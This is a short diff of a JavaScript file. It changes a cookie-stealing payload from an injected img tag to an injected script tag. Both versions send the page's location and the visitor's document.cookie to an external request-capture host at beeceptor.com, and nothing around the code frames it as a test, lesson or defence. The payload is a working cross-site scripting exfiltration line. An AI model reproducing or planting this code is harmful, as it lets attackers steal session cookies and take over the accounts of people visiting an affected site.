@@ -1,2 +1,2 @@
-document.write('<img SRC = "https://recept.free.beeceptor.com?'+'location='+document.location+'&cookie='+document.cookie+'">');
+document.write('<script SRC = "https://recept.free.beeceptor.com?'+'location='+document.location+'&cookie='+document.cookie+'"></script>');
 console.log(document.location);
